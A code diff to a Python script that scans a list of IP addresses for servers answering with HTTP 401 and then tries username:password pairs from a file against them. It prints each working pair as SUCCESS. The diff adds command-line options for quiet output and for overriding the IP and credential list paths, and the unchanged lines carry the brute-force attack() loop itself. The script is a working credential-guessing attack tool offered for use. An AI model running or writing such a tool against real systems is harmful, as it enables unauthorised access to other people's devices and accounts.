@@ -1,9 +1,23 @@
 import requests
+import argparse
 from bs4 import BeautifulSoup
 
 
 requests.packages.urllib3.disable_warnings()
 
+
+def parseargs():
+	"""
+		Parses arguments given to script.
+	"""
+	description="This script iterates over given list of IP addresses to find those that respond with HTTP 401 Authorization request. It then tries to use username:password pairs to pass the authentication."
+	parser = argparse.ArgumentParser()
+	parser.add_argument('-q', "--quiet", action='store_true', default=False, help='If quiet is set, html>title will not be shown.')
+	parser.add_argument('-m', "--mute", action='store_true', default=False, help='Do not show each attempt of authentication.\n')
+	parser.add_argument('-i', "--iplist", metavar='iplist', default=None, help='Override path to file that contains ip list.\n')
+	parser.add_argument('-a', "--authlist", metavar='authlist', default=None, help='Override path to file that contains username:password pairs.\n')
+	args = parser.parse_args()
+	return args
 
 def read_file(filename):
 	return list(open(filename, 'r'))
@@ -42,11 +56,13 @@ def get_title(url):
 	except:
 		return "-"
 
+
 def analyze(url, auth_list):
 	code = check_status(url)
 
 	if code == 200:
-		print(int(code/100), "\t", get_title(url), end="")
+		print(int(code/100), end="\t")
+		if args.quiet == False: print("\t", get_title(url), end="")
 	elif 299 < code < 400:
 		print(int(code/100), end="")
 		location = check_location(url)
@@ -54,14 +70,15 @@ def analyze(url, auth_list):
 	elif code == 401:
 		print(int(code/100), end="\t")
 		attack(url, auth_list)
-		print("\t", get_title(url), end="")
+		if args.quiet == False: print("\t", get_title(url), end="")
 	else:
 		print("OTH", end="")
+
 
 def attack(url, auth_list):
 	for pair in auth_list:
 		user, passwd = pair.split(":")
-		print("|", end="")
+		if args.mute == False: print("|", end="")
 		code = authenticate(url, user, passwd)
 		if code == 200:
 			print("SUCCESS: ", user, passwd)
@@ -75,8 +92,18 @@ def authenticate(url, user, passwd):
 
 
 def main():
+
 	ip_file = "ip.list"
 	auth_file = "auth.list"
+
+	global args, quiet, mute
+	args = parseargs()
+
+	if args.iplist != None:
+		ip_file=(args.iplist)
+	if args.authlist != None:
+		auth_file=(args.authlist)
+
 	ip_list = read_file(ip_file)
 	auth_list = read_file(auth_file)
 
